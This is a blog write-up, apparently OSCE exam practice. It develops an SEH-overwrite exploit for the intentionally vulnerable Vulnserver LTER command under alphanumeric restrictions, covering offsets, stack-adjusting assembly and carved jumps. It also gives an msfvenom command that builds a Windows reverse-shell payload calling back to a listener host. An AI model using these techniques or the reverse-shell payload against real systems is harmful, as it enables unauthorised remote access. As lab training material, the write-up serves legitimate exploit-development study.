---
published: true
title: OSCE Prep - Vulnserver LTER - Alphanumeric Restrictions
tags:
  - Exploit Dev
  - Security Research
---


-----
# Intro
-----
This was probably one of the more complex Vulnserver exploits that I made, requiring lots of jumping around, stack adjustments, and the infamous alphanumeric character restrictions. I took this as an extra opportunity to practice some manual encoding but also sped things up with [this nice script here](https://github.com/ihack4falafel/Slink/blob/master/Slink.py)

While on one hand I found this more complex than the HP NNM exercise in the CTP course, I simultaniously found it easier, probably just because I was familiar with the concepts at this point, and also knew how to fix a mis-aligned stack (not to mention how to spot it).

By the way, for anyone who may be confused about the new look in the screenshots, I started using [x64dgb](https://x64dbg.com/) because of some of the nicer features here and there.

-----
# Part 1 - Starting with the SEH overwrite
-----

Long-time readers of my original blog should be familiar with the basics of an SEH overwrite, so I'll skip over the finer details and just get right to the important bits.

SEH overwrite occurs when sending 4000 "A"s, and the offsets for SEH and nSEH are around 3500:

![]({{site.baseurl}}/assets/images/lter/01.png)

![]({{site.baseurl}}/assets/images/lter/02.png)

![]({{site.baseurl}}/assets/images/lter/04.png)

![]({{site.baseurl}}/assets/images/lter/05.png)

So right away I've got a basically functioning SEH overwrite in the works. From here on out, the alphanumeric restrictions will start affecting how the exploit is written.

-----
# Part 2 - Alphanumeric shellcoding
-----

So now we get to the interesting part. A jump that doesn't use restricted characters. Remember that alphanumeric means we can only use 0x01 thru 0x7F. The usual `JMP SHORT` opcode, `\0xEB`, is outside of that range, so we can't use it.

There are a few different ways to go about jumping with alphanumeric characters, but I chose to do it with a conditional jump, `JZ`, or `Jump if 0`. I chose this because I noticed that the ZF flag was set to 1.

![]({{site.baseurl}}/assets/images/lter/06.png)

After taking the jump:

![]({{site.baseurl}}/assets/images/lter/07.png)

Now I'm in the buffer of "D"s. There isn't a ton of room to work with here so I want to start jumping backwards into the "A" buffer. The biggest jump I can make with a `JMP SHORT` is 127 forwards or backwards, so for now I have to settle on "carving" out the shellcode. To exercise my skills in doing this manually, I did the math on my own to make the shellcode.

Starting out, I need to look at the address of the last "D", and compare that to ESP. I need to make ESP point to the bottom of the "D"s so that any carved shellcode will appear there.

Bottom of the "D"s: `0x00E8FFFE`

ESP after the jump: `0x00E8EC8C`

A difference of 0x1372, or 4978 decimal bytes.

Fortunately, setting up ESP can be done with alphanumeric-friendly opcodes, so this won't have to be encoded.

```nasm
54          PUSH ESP        ; Push the value of ESP onto the stack
58          POP EAX         ; Pop that value into EAX
66057013    ADD AX, 0x1370  ; Add 0x1370 to the AX register to make it 0x00E8FFFC
50          PUSH EAX        ; Push this new value onto the stack
5C          POP ESP         ; Pop this value into ESP
```

I ended up cutting it short by 2 bytes, because setting ESP to `0x00E8FFFE` caused the stack to be out of alignment. With ESP now set, I can get to work carving out my shellcode.

Using the addition method, I 0 out EAX, do some math to it to match `0x909080EB`, and push that onto the stack, making the opcodes appear out of thin air:

![]({{site.baseurl}}/assets/images/lter/08.png)

![]({{site.baseurl}}/assets/images/lter/09.png)

Now that I have some space in the "A"s, I need to once again set ESP to the bottom of the "A"s so that carved shellcode appears there.

Last "A": `0x00E9FFCB`

ESP: `0x00E9FFFF`

A difference of 0x34 or 52 decimal bytes.

```nasm
54      PUSH ESP
58      POP EAX
2C34    SUB AL, 0x34
50      PUSH EAX
5C      POP ESP
```

Here is where things get complicated. I need to put this adjust as high up as I can so I have room for carving. I need to pay attention to where I landed in the "A" buffer, and figure out how far away from the FIRST "A" I am, so I can adjust that initial crash buffer.

The first "A": `0x00E9F1EE`

Where I am after the backwards jump: `0x00E9FF7A`

A difference of 3468 decimal bytes, which means I modify my payload accordingly:

![]({{site.baseurl}}/assets/images/lter/10.png)

The extra padding after `espAdj2` is to make sure the payload stays the same size and all the instructions injected so far stay where they are. Now that everything is in position, I test the ESP adjust:

![]({{site.baseurl}}/assets/images/lter/11.png)

![]({{site.baseurl}}/assets/images/lter/12.png)

The addresses changed here because they kept changing between restarts of the program in between changes to the payload, so disregard that, all that's important is that the offsets are calculated right.

With the extra space prepared, we're ready to carve out a bigger jump back, that will take more shellcode that couldn't have been previously fit in. I want to leverage all the space I have for the final payload, so I want to jump to the start of the "A" buffer. I'll do this by manipulating EBX and then jumping to it. I'm using EBX since EAX will be tied up with the "carving".

The first "A": `0x010AFFCB`

ESP: `0x010AF1EE`

A difference of 0xDDD or 3549 decimal bytes.
This is the shellcode I want to use:

```nasm
54            PUSH ESP
5B            POP EBX
81EBDD0D0000  SUB EBX, 0xDDD
FFD3          CALL EBX
```

I can save myself some carving by just putting `\x54\x5B` right into the payload since they're alphanumeric-friendly. The rest will need to be carved:

![]({{site.baseurl}}/assets/images/lter/13.png)

After stepping-thru the carver:

![]({{site.baseurl}}/assets/images/lter/14.png)

Now is when things get a little complex, because the stack is out of alignment again, and my payload is dying because of the misalignment:

![]({{site.baseurl}}/assets/images/lter/22.png)

The stack only seems slightly out of alignment so it should be easy to fix. Looking at the Disassembler pane after letting everything run up to this point, I figure out a place to sneak in the adjustment.

My `CALL EBX` is just above my nSEH overwrite, so counting the bytes up from there over the carved shellcode, I slip in a `INC ESP` instruction just before it:

![]({{site.baseurl}}/assets/images/lter/23.png)

![]({{site.baseurl}}/assets/images/lter/24.png)

It was a much simpler fix than I was fearing, and it seems like it's a bit of a jury-rigged fix, but it works, so I left it in.

![]({{site.baseurl}}/assets/images/lter/25.png)

![]({{site.baseurl}}/assets/images/lter/26.png)

At this point the stack is aligned properly and I'm no longer getting the `MISALIGNED` errors.

Finally with everything falling into place, I create the shellcode:

`msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.128 LPORT=443 -f python -b '\x00' -e x86/alpha_mixed BufferRegister=EBX -v shellcode`

When generating alphanumeric shellcode, MSFvenom still prepends the payload with non-alphanumeric characters, which is very frustrating to say the least. This is because it needs some code to find itself in memory to use as a reference point for other operations. Luckily if you tell it where it is using a register, it becomes 100% alphanumeric-friendly. Since `EBX` is pointing to the top of the "A"s, I decide to put the shellcode right there, and tell MSFvenom that the shellcode is at the value in `EBX` with `BufferRegister=EBX`.

Everything should be ready to go. I let the payload execute fully:

![]({{site.baseurl}}/assets/images/lter/21.png)

-----
# Conclusion
-----

Overall this one was a good exercise not only in using creative ways of jumping around code, but using alphanumeric restrictions. When tampering with ESP like this you have to keep an eye on the stack and make sure it stays aligned, and if you can't avoid misaligning, you must fix it, otherwise all the parameters for your shell that get pushed onto the stack will be corrupted and the payload won't work. As arbitrary as it seems, there are some programs out there that will convert input into alphanumeric characters in the real world, so knowing how to work with these limitations is important to being a security researcher and exploit dev.

At this point, I've done just about everything vulnserver has to offer. There's one command I've yet to do, and to my understanding, it's a function that interprets your input as literal hex characters. I might do it at some point, but right now it doesn't seem all that critical to me. Other blogs have write ups for it so go check them out.
